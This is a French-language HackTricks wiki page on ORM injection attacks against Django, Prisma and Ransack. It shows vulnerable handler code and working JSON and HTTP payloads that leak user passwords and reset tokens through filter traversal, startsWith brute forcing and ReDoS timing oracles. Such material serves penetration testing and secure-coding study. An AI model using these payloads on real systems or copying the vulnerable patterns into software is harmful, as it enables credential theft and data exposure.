# Injection ORM

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team GCP (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

## Django ORM (Python)

Dans [**cet article**](https://www.elttam.com/blog/plormbing-your-django-orm/) est expliqu√© comment il est possible de rendre un ORM Django vuln√©rable en utilisant par exemple un code comme :

<pre class="language-python"><code class="lang-python">class ArticleView(APIView):
"""
Une vue API de base √† laquelle les utilisateurs envoient des requ√™tes pour
chercher des articles
"""
def post(self, request: Request, format=None):
try:
<strong>            articles = Article.objects.filter(**request.data)
</strong>            serializer = ArticleSerializer(articles, many=True)
except Exception as e:
return Response([])
return Response(serializer.data)
</code></pre>

Notez comment toutes les request.data (qui seront un json) sont directement pass√©es √† **filtrer des objets de la base de donn√©es**. Un attaquant pourrait envoyer des filtres inattendus afin de leak plus de donn√©es que pr√©vu.

Exemples :

* **Connexion :** Dans une simple connexion, essayez de leak les mots de passe des utilisateurs enregistr√©s √† l'int√©rieur.
```json
{
"username": "admin",
"password_startswith":"a"
}
```
{% hint style="danger" %}
Il est possible de forcer le mot de passe jusqu'√† ce qu'il soit divulgu√©.
{% endhint %}

* **Filtrage relationnel** : Il est possible de traverser des relations afin de divulguer des informations provenant de colonnes qui n'√©taient m√™me pas cens√©es √™tre utilis√©es dans l'op√©ration. Par exemple, s'il est possible de divulguer des articles cr√©√©s par un utilisateur avec ces relations : Article(`created_by`) -\[1..1]-> Auteur (`user`) -\[1..1]-> Utilisateur(`password`).
```json
{
"created_by__user__password__contains":"pass"
}
```
{% hint style="danger" %}
Il est possible de trouver le mot de passe de tous les utilisateurs qui ont cr√©√© un article
{% endhint %}

* **Filtrage relationnel plusieurs-√†-plusieurs** : Dans l'exemple pr√©c√©dent, nous ne pouvions pas trouver les mots de passe des utilisateurs qui n'ont pas cr√©√© d'article. Cependant, en suivant d'autres relations, cela est possible. Par exemple : Article(`created_by`) -\[1..1]-> Auteur(`departments`) -\[0..\*]-> D√©partement(`employees`) -\[0..\*]-> Auteur(`user`) -\[1..1]-> Utilisateur(`password`).
```json
{
"created_by__departments__employees__user_startswith":"admi"
}
```
{% hint style="danger" %}
Dans ce cas, nous pouvons trouver tous les utilisateurs dans les d√©partements d'utilisateurs qui ont cr√©√© des articles et ensuite fuir leurs mots de passe (dans le json pr√©c√©dent, nous ne fuyons que les noms d'utilisateur, mais il est ensuite possible de fuir les mots de passe).
{% endhint %}

* **Abus des relations many-to-many entre les groupes et les permissions de Django avec les utilisateurs** : De plus, le mod√®le AbstractUser est utilis√© pour g√©n√©rer des utilisateurs dans Django et par d√©faut, ce mod√®le a certaines **relations many-to-many avec les tables Permission et Group**. Ce qui est essentiellement un moyen par d√©faut d'**acc√©der √† d'autres utilisateurs √† partir d'un utilisateur** s'ils sont dans le **m√™me groupe ou partagent la m√™me permission**.
```bash
# By users in the same group
created_by__user__groups__user__password

# By users with the same permission
created_by__user__user_permissions__user__password
```
* **Contourner les restrictions de filtre** : Le m√™me article de blog a propos√© de contourner l'utilisation de certains filtres comme `articles = Article.objects.filter(is_secret=False, **request.data)`. Il est possible de r√©cup√©rer des articles qui ont is\_secret=True car nous pouvons revenir en arri√®re √† partir d'une relation vers la table Article et divulguer des articles secrets √† partir d'articles non secrets car les r√©sultats sont joints et le champ is\_secret est v√©rifi√© dans l'article non secret tandis que les donn√©es sont divulgu√©es √† partir de l'article secret.
```bash
Article.objects.filter(is_secret=False, categories__articles__id=2)
```
{% hint style="danger" %}
En abusant des relations, il est possible de contourner m√™me les filtres destin√©s √† prot√©ger les donn√©es affich√©es.
{% endhint %}

* **Bas√© sur l'erreur/le temps via ReDoS** : Dans les exemples pr√©c√©dents, il √©tait pr√©vu d'avoir des r√©ponses diff√©rentes si le filtrage fonctionnait ou non pour l'utiliser comme oracle. Mais il pourrait √™tre possible qu'une action soit effectu√©e dans la base de donn√©es et que la r√©ponse soit toujours la m√™me. Dans ce sc√©nario, il pourrait √™tre possible de provoquer une erreur de la base de donn√©es pour obtenir un nouvel oracle.
```json
// Non matching password
{
"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"
}

// ReDoS matching password (will show some error in the response or check the time)
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
```
From te same post regarding this vector:

* **SQLite** : N'a pas d'op√©rateur regexp par d√©faut (n√©cessite le chargement d'une extension tierce)
* **PostgreSQL** : N'a pas de d√©lai d'expiration regex par d√©faut et est moins sujet au backtracking
* **MariaDB** : N'a pas de d√©lai d'expiration regex

## Prisma ORM (NodeJS)

Les √©l√©ments suivants sont [**des astuces extraites de ce post**](https://www.elttam.com/blog/plorming-your-primsa-orm/).

* **Contr√¥le complet de la recherche** :

<pre class="language-javascript"><code class="lang-javascript">const app = express();

app.use(express.json());

app.post('/articles/verybad', async (req, res) => {
try {
// L'attaquant a un contr√¥le total sur toutes les options prisma
<strong>        const posts = await prisma.article.findMany(req.body.filter)
</strong>        res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

Il est possible de voir que l'ensemble du corps javascript est pass√© √† prisma pour effectuer des requ√™tes.

Dans l'exemple du post original, cela v√©rifierait tous les posts cr√©√©s par quelqu'un (chaque post est cr√©√© par quelqu'un) retournant √©galement les informations de l'utilisateur de cette personne (nom d'utilisateur, mot de passe...)
```json
{
"filter": {
"include": {
"createdBy": true
}
}
}

// Response
[
{
"id": 1,
"title": "Buy Our Essential Oils",
"body": "They are very healthy to drink",
"published": true,
"createdById": 1,
"createdBy": {
"email": "karen@example.com",
"id": 1,
"isAdmin": false,
"name": "karen",
"password": "super secret passphrase",
"resetToken": "2eed5e80da4b7491"
}
},
...
]
```
```markdown
Le suivant s√©lectionne tous les posts cr√©√©s par quelqu'un avec un mot de passe et renverra le mot de passe :
```
```json
{
"filter": {
"select": {
"createdBy": {
"select": {
"password": true
}
}
}
}
}

// Response
[
{
"createdBy": {
"password": "super secret passphrase"
}
},
...
]
```
* **Contr√¥le complet de la clause where** :

Examinons cela o√π l'attaque peut contr√¥ler la clause `where` :

<pre class="language-javascript"><code class="lang-javascript">app.get('/articles', async (req, res) => {
try {
const posts = await prisma.article.findMany({
<strong>            where: req.query.filter as any // Vuln√©rable aux fuites ORM
</strong>        })
res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

Il est possible de filtrer le mot de passe des utilisateurs directement comme :
```javascript
await prisma.article.findMany({
where: {
createdBy: {
password: {
startsWith: "pas"
}
}
}
})
```
{% hint style="danger" %}
En utilisant des op√©rations comme `startsWith`, il est possible de leak des informations.&#x20;
{% endhint %}

* **Contournement du filtrage relationnel plusieurs-√†-plusieurs :**&#x20;
```javascript
app.post('/articles', async (req, res) => {
try {
const query = req.body.query;
query.published = true;
const posts = await prisma.article.findMany({ where: query })
res.json(posts);
} catch (error) {
res.json([]);
}
});
```
Il est possible de leak des articles non publi√©s en revenant aux relations plusieurs-√†-plusieurs entre `Category` -\[\*..\*]-> `Article`:
```json
{
"query": {
"categories": {
"some": {
"articles": {
"some": {
"published": false,
"{articleFieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
```
Il est √©galement possible de leak tous les utilisateurs en abusant de certaines relations many-to-many en boucle :
```json
{
"query": {
"createdBy": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"{fieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
```
* **Error/Timed queries**: Dans le post original, vous pouvez lire un ensemble tr√®s complet de tests effectu√©s afin de trouver la charge utile optimale pour divulguer des informations avec une charge utile bas√©e sur le temps. Ceci est :
```json
{
"OR": [
{
"NOT": {ORM_LEAK}
},
{CONTAINS_LIST}
]
}
```
O√π le `{CONTAINS_LIST}` est une liste de 1000 cha√Ænes pour s'assurer que **la r√©ponse est retard√©e lorsque la fuite correcte est trouv√©e.**

## **Ransack (Ruby)**

Ces astuces ont √©t√© [**trouv√©es dans ce post**](https://positive.security/blog/ransack-data-exfiltration)**.**

{% hint style="success" %}
**Notez que Ransack 4.0.0.0 impose d√©sormais l'utilisation d'une liste d'autorisation explicite pour les attributs et associations recherchables.**
{% endhint %}

**Exemple vuln√©rable :**
```ruby
def index
@q = Post.ransack(params[:q])
@posts = @q.result(distinct: true)
end
```
Notez comment la requ√™te sera d√©finie par les param√®tres envoy√©s par l'attaquant. Il √©tait possible, par exemple, de forcer le jeton de r√©initialisation avec :
```http
GET /posts?q[user_reset_password_token_start]=0
GET /posts?q[user_reset_password_token_start]=1
...
```
En for√ßant et potentiellement en √©tablissant des relations, il √©tait possible de leak plus de donn√©es d'une base de donn√©es.

## R√©f√©rences

* [https://www.elttam.com/blog/plormbing-your-django-orm/](https://www.elttam.com/blog/plormbing-your-django-orm/)
* [https://www.elttam.com/blog/plorming-your-primsa-orm/](https://www.elttam.com/blog/plorming-your-primsa-orm/)
* [https://positive.security/blog/ransack-data-exfiltration](https://positive.security/blog/ransack-data-exfiltration)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
